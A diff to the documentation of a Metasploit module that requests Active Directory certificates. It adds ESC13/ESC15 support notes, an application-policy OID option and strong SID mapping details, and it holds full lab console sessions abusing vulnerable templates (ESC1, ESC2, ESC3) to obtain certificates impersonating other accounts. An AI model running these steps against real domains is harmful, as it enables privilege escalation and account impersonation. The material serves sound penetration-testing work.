@@ -3,7 +3,9 @@ Request certificates via MS-ICPR (Active Directory Certificate Services). Depend
 template's configuration the resulting certificate can be used for various operations such as authentication.
 PFX certificate files that are saved are encrypted with a blank password.
 
-## Module usage 
+This module is capable of exploiting ESC1, ESC2, ESC3, ESC13 and ESC15.
+
+## Module usage
 
 1. From msfconsole
 2. Do: `use auxiliary/admin/dcerpc/icpr_cert`
@@ -17,6 +19,19 @@ The target certificate authority. The default value used by AD CS is `$domain-DC
 
 ### CERT_TEMPLATE
 The certificate template to issue, e.g. "User".
+
+### ADD_CERT_APP_POLICY
+Add certificate application policy OIDs to the certificate. The ability to add policy OIDs to the certificate is
+dependent on it's configuration. More than one OID can be specified, separated by spaces, `;`, or `,`.
+
+Some useful OIDs for this purpose include:
+
+* `1.3.6.1.4.1.311.20.2.2` -- Smart Card Logon
+* `1.3.6.1.5.2.3.4` -- PKINIT Client Authentication
+* `1.3.6.1.5.5.7.3.1` -- Server Authentication
+* `1.3.6.1.5.5.7.3.2` -- Client Authentication
+* `1.3.6.1.5.5.7.3.3` -- Code Signing
+* `1.3.6.1.4.1.311.20.2.1` -- Certificate Request Agent
 
 ### ALT_DNS
 Alternative DNS name to specify in the certificate. Useful in certain attack scenarios.
@@ -46,6 +61,12 @@ Username to request on behalf of. This is in the format `$domain\\$username`.
 
 The digest algorithm to use for cryptographic signing operations.
 
+When set to `true`, the module will use strong URL to SID mapping when requesting a certificate that contains a URL SAN.
+This is done by adding the `tag:microsoft.com,2022-09-14:sid:` part to the SAN which is formatted like so:
+`URL=tag:microsoft.com,2022-09-14:sid:<value>`. This option was introduced to maintain compatibility with older windows
+versions as this is not compatible with versions prior to Windows Server Preview Build 25246.
+[More info](https://techcommunity.microsoft.com/blog/askds/preview-of-san-uri-for-certificate-strong-mapping-for-kb5014754/3789785)
+
 ## Actions
 
 ### REQUEST_CERT
@@ -58,14 +79,14 @@ For this module to work, it's necessary to know the name of a CA and certificate
 by a normal user via LDAP.
 
 ```msf
-msf6 > use auxiliary/gather/ldap_query
-msf6 auxiliary(gather/ldap_query) > set BIND_DN aliddle@msflab.local
+msf > use auxiliary/gather/ldap_query
+msf auxiliary(gather/ldap_query) > set BIND_DN aliddle@msflab.local
 BIND_DN => aliddle@msflab.local
-msf6 auxiliary(gather/ldap_query) > set BIND_PW Password1!
+msf auxiliary(gather/ldap_query) > set BIND_PW Password1!
 BIND_PW => Password1!
-msf6 auxiliary(gather/ldap_query) > set ACTION ENUM_AD_CS_CAS
+msf auxiliary(gather/ldap_query) > set ACTION ENUM_AD_CS_CAS
 ACTION => ENUM_AD_CS_CAS
-msf6 auxiliary(gather/ldap_query) > run
+msf auxiliary(gather/ldap_query) > run
 [*] Running module against 192.168.159.10
 
 [+] Successfully bound to the LDAP server!
@@ -84,7 +105,7 @@ CN=msflab-DC-CA CN=Enrollment Services CN=Public Key Services CN=Services CN=Con
  name                  msflab-DC-CA
 
 [*] Auxiliary module execution completed
-msf6 auxiliary(gather/ldap_query) >
+msf auxiliary(gather/ldap_query) >
 ```
 
 ### Issue A Generic Certificate
@@ -92,18 +113,18 @@ In this scenario, an authenticated user issues a certificate for themselves usin
 by default. The user must know the CA name, which in this case is `msflab-DC-CA`.
 
 ```msf
-msf6 > use auxiliary/admin/dcerpc/icpr_cert
-msf6 auxiliary(admin/dcerpc/icpr_cert) > set RHOSTS 192.168.159.10
+msf > use auxiliary/admin/dcerpc/icpr_cert
+msf auxiliary(admin/dcerpc/icpr_cert) > set RHOSTS 192.168.159.10
 RHOSTS => 192.168.159.10
-msf6 auxiliary(admin/dcerpc/icpr_cert) > set SMBUser aliddle
+msf auxiliary(admin/dcerpc/icpr_cert) > set SMBUser aliddle
 SMBUser => aliddle
-msf6 auxiliary(admin/dcerpc/icpr_cert) > set SMBPass Password1!
+msf auxiliary(admin/dcerpc/icpr_cert) > set SMBPass Password1!
 SMBPass => Password1!
-msf6 auxiliary(admin/dcerpc/icpr_cert) > set CA msflab-DC-CA
+msf auxiliary(admin/dcerpc/icpr_cert) > set CA msflab-DC-CA
 CA => msflab-DC-CA
-msf6 auxiliary(admin/dcerpc/icpr_cert) > set CERT_TEMPLATE User
+msf auxiliary(admin/dcerpc/icpr_cert) > set CERT_TEMPLATE User
 CERT_TEMPLATE => User
-msf6 auxiliary(admin/dcerpc/icpr_cert) > run
+msf auxiliary(admin/dcerpc/icpr_cert) > run
 [*] Running module against 192.168.159.10
 
 [*] 192.168.159.10:445 - Connecting to ICertPassage (ICPR) Remote Protocol
@@ -115,7 +136,7 @@ msf6 auxiliary(admin/dcerpc/icpr_cert) > run
 [*] 192.168.159.10:445 - Certificate SID: S-1-5-21-3402587289-1488798532-3618296993-1106
 [*] 192.168.159.10:445 - Certificate stored at: /home/smcintyre/.msf4/loot/20220824125053_default_unknown_windows.ad.cs_545696.pfx
 [*] Auxiliary module execution completed
-msf6 auxiliary(admin/dcerpc/icpr_cert) >
+msf auxiliary(admin/dcerpc/icpr_cert) >
 ```
 
 ### Issue A Certificate With A Specific subjectAltName (AKA ESC1)
@@ -139,24 +160,24 @@ See [Certified Pre-Owned](https://posts.specterops.io/certified-pre-owned-d95910
 information.
 
 ```msf
-msf6 > use auxiliary/admin/dcerpc/icpr_cert
-msf6 auxiliary(admin/dcerpc/icpr_cert) > set RHOSTS 192.168.159.10
+msf > use auxiliary/admin/dcerpc/icpr_cert
+msf auxiliary(admin/dcerpc/icpr_cert) > set RHOSTS 192.168.159.10
 RHOSTS => 192.168.159.10
-msf6 auxiliary(admin/dcerpc/icpr_cert) > set SMBUser aliddle
+msf auxiliary(admin/dcerpc/icpr_cert) > set SMBUser aliddle
 SMBUser => aliddle
-msf6 auxiliary(admin/dcerpc/icpr_cert) > set SMBPass Password1!
+msf auxiliary(admin/dcerpc/icpr_cert) > set SMBPass Password1!
 SMBPass => Password1!
-msf6 auxiliary(admin/dcerpc/icpr_cert) > set CA msflab-DC-CA
+msf auxiliary(admin/dcerpc/icpr_cert) > set CA msflab-DC-CA
 CA => msflab-DC-CA
-msf6 auxiliary(admin/dcerpc/icpr_cert) > set CERT_TEMPLATE ESC1-Test
+msf auxiliary(admin/dcerpc/icpr_cert) > set CERT_TEMPLATE ESC1-Test
 CERT_TEMPLATE => ESC1-Test
-msf6 auxiliary(admin/dcerpc/icpr_cert) > set ALT_SID S-1-5-21-3402587289-1488798532-3618296993-1000
+msf auxiliary(admin/dcerpc/icpr_cert) > set ALT_SID S-1-5-21-3402587289-1488798532-3618296993-1000
 ALT_SID => S-1-5-21-3402587289-1488798532-3618296993-1000
-msf6 auxiliary(admin/dcerpc/icpr_cert) > set ALT_UPN smcintyre@msflab.local
+msf auxiliary(admin/dcerpc/icpr_cert) > set ALT_UPN smcintyre@msflab.local
 ALT_UPN => smcintyre@msflab.local
-msf6 auxiliary(admin/dcerpc/icpr_cert) > set VERBOSE true
+msf auxiliary(admin/dcerpc/icpr_cert) > set VERBOSE true
 VERBOSE => true
-msf6 auxiliary(admin/dcerpc/icpr_cert) > run
+msf auxiliary(admin/dcerpc/icpr_cert) > run
 [*] Running module against 192.168.159.10
 
 [*] 192.168.159.10:445 - Connecting to ICertPassage (ICPR) Remote Protocol
@@ -168,7 +189,7 @@ msf6 auxiliary(admin/dcerpc/icpr_cert) > run
 [*] 192.168.159.10:445 - Certificate UPN: smcintyre@msflab.local
 [*] 192.168.159.10:445 - Certificate stored at: /home/smcintyre/.msf4/loot/20230608111432_default_192.168.159.10_windows.ad.cs_029062.pfx
 [*] Auxiliary module execution completed
-msf6 auxiliary(admin/dcerpc/icpr_cert) > 
+msf auxiliary(admin/dcerpc/icpr_cert) > 
 ```
 
 ### Issue A Certificate With The *Any Purpose* EKU (AKA ESC2)
@@ -187,18 +208,18 @@ information.
 The first step is to issue a certificate using the vulnerable certificate template.
 
 ```msf
-msf6 > use auxiliary/admin/dcerpc/icpr_cert 
-msf6 auxiliary(admin/dcerpc/icpr_cert) > set RHOSTS 192.168.159.10
+msf > use auxiliary/admin/dcerpc/icpr_cert 
+msf auxiliary(admin/dcerpc/icpr_cert) > set RHOSTS 192.168.159.10
 RHOSTS => 192.168.159.10
-msf6 auxiliary(admin/dcerpc/icpr_cert) > set SMBUser aliddle
+msf auxiliary(admin/dcerpc/icpr_cert) > set SMBUser aliddle
 SMBUser => aliddle
-msf6 auxiliary(admin/dcerpc/icpr_cert) > set SMBPass Password1!
+msf auxiliary(admin/dcerpc/icpr_cert) > set SMBPass Password1!
 SMBPass => Password1!
-msf6 auxiliary(admin/dcerpc/icpr_cert) > set CA msflab-DC-CA
+msf auxiliary(admin/dcerpc/icpr_cert) > set CA msflab-DC-CA
 CA => msflab-DC-CA
-msf6 auxiliary(admin/dcerpc/icpr_cert) > set CERT_TEMPLATE ESC2-Test
+msf auxiliary(admin/dcerpc/icpr_cert) > set CERT_TEMPLATE ESC2-Test
 CERT_TEMPLATE => ESC2-Test
-msf6 auxiliary(admin/dcerpc/icpr_cert) > run
+msf auxiliary(admin/dcerpc/icpr_cert) > run
 [*] Running module against 192.168.159.10
 
 [*] 192.168.159.10:445 - Connecting to ICertPassage (ICPR) Remote Protocol
@@ -208,7 +229,7 @@ msf6 auxiliary(admin/dcerpc/icpr_cert) > run
 [+] 192.168.159.10:445 - The requested certificate was issued.
 [*] 192.168.159.10:445 - Certificate stored at: /home/smcintyre/.msf4/loot/20221107153602_default_unknown_windows.ad.cs_269882.pfx
 [*] Auxiliary module execution completed
-msf6 auxiliary(admin/dcerpc/icpr_cert) >
+msf auxiliary(admin/dcerpc/icpr_cert) >
 ```
 
 #### Step 2
@@ -217,13 +238,13 @@ the target user. The `CERT_TEMPLATE` option is updated to one allowing authentic
 template.
 
 ```msf
-msf6 auxiliary(admin/dcerpc/icpr_cert) > set PFX /home/smcintyre/.msf4/loot/20221107153602_default_unknown_windows.ad.cs_269882.pfx
+msf auxiliary(admin/dcerpc/icpr_cert) > set PFX /home/smcintyre/.msf4/loot/20221107153602_default_unknown_windows.ad.cs_269882.pfx
 PFX => /home/smcintyre/.msf4/loot/20221107153602_default_unknown_windows.ad.cs_269882.pfx
-msf6 auxiliary(admin/dcerpc/icpr_cert) > set ON_BEHALF_OF MSFLAB\\smcintyre
+msf auxiliary(admin/dcerpc/icpr_cert) > set ON_BEHALF_OF MSFLAB\\smcintyre
 ON_BEHALF_OF => MSFLAB\smcintyre
-msf6 auxiliary(admin/dcerpc/icpr_cert) > set CERT_TEMPLATE User
+msf auxiliary(admin/dcerpc/icpr_cert) > set CERT_TEMPLATE User
 CERT_TEMPLATE => User
-msf6 auxiliary(admin/dcerpc/icpr_cert) > run
+msf auxiliary(admin/dcerpc/icpr_cert) > run
 [*] Running module against 192.168.159.10
 
 [*] 192.168.159.10:445 - Connecting to ICertPassage (ICPR) Remote Protocol
@@ -236,7 +257,7 @@ msf6 auxiliary(admin/dcerpc/icpr_cert) > run
 [*] 192.168.159.10:445 - Certificate SID: S-1-5-21-3402587289-1488798532-3618296993-1000
 [*] 192.168.159.10:445 - Certificate stored at: /home/smcintyre/.msf4/loot/20221107153713_default_unknown_windows.ad.cs_275853.pfx
 [*] Auxiliary module execution completed
-msf6 auxiliary(admin/dcerpc/icpr_cert) >
+msf auxiliary(admin/dcerpc/icpr_cert) >
 ```
 
 ### Issue A Certificate With The *Certificate Request Agent* EKU (AKA ESC3)
@@ -255,18 +276,18 @@ request another certificate on behalf of the target account.
 The first step is to issue a certificate using the vulnerable certificate template.
 
 ```msf
-msf6 > use auxiliary/admin/dcerpc/icpr_cert
-msf6 auxiliary(admin/dcerpc/icpr_cert) > set RHOSTS 192.168.159.10
+msf > use auxiliary/admin/dcerpc/icpr_cert
+msf auxiliary(admin/dcerpc/icpr_cert) > set RHOSTS 192.168.159.10
 RHOSTS => 192.168.159.10
-msf6 auxiliary(admin/dcerpc/icpr_cert) > set SMBUser aliddle
+msf auxiliary(admin/dcerpc/icpr_cert) > set SMBUser aliddle
 SMBUser => aliddle
-msf6 auxiliary(admin/dcerpc/icpr_cert) > set SMBPass Password1!
+msf auxiliary(admin/dcerpc/icpr_cert) > set SMBPass Password1!
 SMBPass => Password1!
-msf6 auxiliary(admin/dcerpc/icpr_cert) > set CA msflab-DC-CA
+msf auxiliary(admin/dcerpc/icpr_cert) > set CA msflab-DC-CA
 CA => msflab-DC-CA
-msf6 auxiliary(admin/dcerpc/icpr_cert) > set CERT_TEMPLATE ESC3-Test
+msf auxiliary(admin/dcerpc/icpr_cert) > set CERT_TEMPLATE ESC3-Test
 CERT_TEMPLATE => ESC3-Test
-msf6 auxiliary(admin/dcerpc/icpr_cert) > run
+msf auxiliary(admin/dcerpc/icpr_cert) > run
 [*] Running module against 192.168.159.10
 
 [*] 192.168.159.10:445 - Connecting to ICertPassage (ICPR) Remote Protocol
@@ -278,7 +299,7 @@ msf6 auxiliary(admin/dcerpc/icpr_cert) > run
 [*] 192.168.159.10:445 - Certificate SID: S-1-5-21-3402587289-1488798532-3618296993-1106
 [*] 192.168.159.10:445 - Certificate stored at: /home/smcintyre/.msf4/loot/20221107154656_default_unknown_windows.ad.cs_831021.pfx
 [*] Auxiliary module execution completed
-msf6 auxiliary(admin/dcerpc/icpr_cert) >
+msf auxiliary(admin/dcerpc/icpr_cert) >
 ```
 
 #### Step 2
@@ -287,13 +308,13 @@ the target user. The `CERT_TEMPLATE` option is updated to one allowing authentic
 template.
 
 ```msf
-msf6 auxiliary(admin/dcerpc/icpr_cert) > set PFX /home/smcintyre/.msf4/loot/20221107154656_default_unknown_windows.ad.cs_831021.pfx
+msf auxiliary(admin/dcerpc/icpr_cert) > set PFX /home/smcintyre/.msf4/loot/20221107154656_default_unknown_windows.ad.cs_831021.pfx
 PFX => /home/smcintyre/.msf4/loot/20221107154656_default_unknown_windows.ad.cs_831021.pfx
-msf6 auxiliary(admin/dcerpc/icpr_cert) > set ON_BEHALF_OF MSFLAB\\smcintyre
+msf auxiliary(admin/dcerpc/icpr_cert) > set ON_BEHALF_OF MSFLAB\\smcintyre
 ON_BEHALF_OF => MSFLAB\smcintyre
-msf6 auxiliary(admin/dcerpc/icpr_cert) > set CERT_TEMPLATE User
+msf auxiliary(admin/dcerpc/icpr_cert) > set CERT_TEMPLATE User
 CERT_TEMPLATE => User
-msf6 auxiliary(admin/dcerpc/icpr_cert) > run
+msf auxiliary(admin/dcerpc/icpr_cert) > run
 [*] Running module against 192.168.159.10
 
 [*] 192.168.159.10:445 - Connecting to ICertPassage (ICPR) Remote Protocol
@@ -306,7 +327,7 @@ msf6 auxiliary(admin/dcerpc/icpr_cert) > run
 [*] 192.168.159.10:445 - Certificate SID: S-1-5-21-3402587289-1488798532-3618296993-1000
 [*] 192.168.159.10:445 - Certificate stored at: /home/smcintyre/.msf4/loot/20221107154740_default_unknown_windows.ad.cs_567059.pfx
 [*] Auxiliary module execution completed
-msf6 auxiliary(admin/dcerpc/icpr_cert) >
+msf auxiliary(admin/dcerpc/icpr_cert) >
 ```
 
 [KB5014754]: https://support.microsoft.com/en-us/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16
